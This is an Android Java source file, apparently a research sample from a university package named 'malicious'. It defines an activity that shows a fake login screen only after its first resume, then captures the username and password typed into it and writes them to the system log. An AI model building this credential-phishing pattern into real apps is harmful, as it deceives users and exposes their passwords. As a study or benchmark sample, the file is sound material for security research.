package edu.ksu.cs.malicious;

import android.os.Bundle;
import android.support.v7.app.AppCompatActivity;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;

public class NonLauncherActivity extends AppCompatActivity {

    private static boolean disp = false;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
    }

    @Override
    protected void onResume() {
        super.onResume();
        if (disp) {
            setContentView(R.layout.activity_non_launcher);
            final EditText user = (EditText) findViewById(R.id.username);
            final EditText pwd = (EditText) findViewById(R.id.pwd);
            Button signIn = (Button) findViewById(R.id.signIn);
            signIn.setOnClickListener(new View.OnClickListener() {
                @Override
                public void onClick(View v) {
                    saveCredentials(user.getText().toString(), pwd.getText().toString());
                }
            });
        }
        disp = true;
    }

    private void saveCredentials(String username, String password) {
        Log.d("Malicious", "User : " + username + " Password : " + password);
    }
}
